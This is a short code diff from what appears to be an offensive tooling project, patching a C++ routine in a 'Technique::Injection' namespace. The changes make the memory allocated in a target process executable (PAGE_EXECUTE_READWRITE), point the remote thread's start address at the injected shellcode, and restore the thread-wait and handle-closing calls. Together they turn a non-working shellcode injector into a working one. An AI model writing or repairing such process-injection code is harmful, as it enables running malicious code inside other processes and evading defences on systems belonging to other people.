@@ -7,7 +7,6 @@ namespace Technique::Injection
         HANDLE hProcess;
         HANDLE hThread;
         PVOID pBaseAddr;
-        BOOL bResults;
 
         hProcess = System::Process::ProcessOpen(pProcs, dwPID, PROCESS_ALL_ACCESS);
         if (!hProcess)
@@ -20,7 +19,7 @@ namespace Technique::Injection
             hProcess,
             shellcode.size(),
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE
+            PAGE_EXECUTE_READWRITE
         );
         if (!pBaseAddr)
         {
@@ -50,8 +49,8 @@ namespace Technique::Injection
         hThread = System::Process::RemoteThreadCreate(
             pProcs,
             hProcess,
-            NULL,
-            pBaseAddr
+            (LPTHREAD_START_ROUTINE)pBaseAddr,
+            NULL
         );
         if (!hThread)
         {
@@ -66,10 +65,10 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        // pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
+        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
 
-        // pProcs->lpNtClose(hProcess);
-        // pProcs->lpNtClose(hThread);
+        pProcs->lpNtClose(hProcess);
+        pProcs->lpNtClose(hThread);
 
         return TRUE;
     }
